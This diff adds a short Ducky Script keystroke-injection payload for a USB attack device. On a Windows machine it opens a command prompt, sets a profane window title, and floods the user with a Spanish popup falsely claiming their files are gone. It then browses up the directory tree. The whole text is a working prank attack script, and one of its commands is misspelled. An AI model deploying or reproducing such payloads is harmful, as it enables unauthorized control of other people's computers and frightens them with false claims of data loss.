@@ -1,0 +1,25 @@
+DELAY 600
+GUI r
+DELAY 300
+SPACE
+STRING CMD
+ENTER
+DELAY 300
+STRING color a
+ENTER
+STRING title --------------------FUCK U--------------------
+ENTER
+DELAY 300
+STRING msg * /V /W Te la comiste cruck, sin tus archivos a ver quien rie mas.
+REPET 20
+DELAY 100
+ENTER
+DELAY 300
+STRING CD..
+ENTER
+DELAY 100
+STRING CD..
+ENTER
+DELAY 200
+STRING TREE
+ENTER
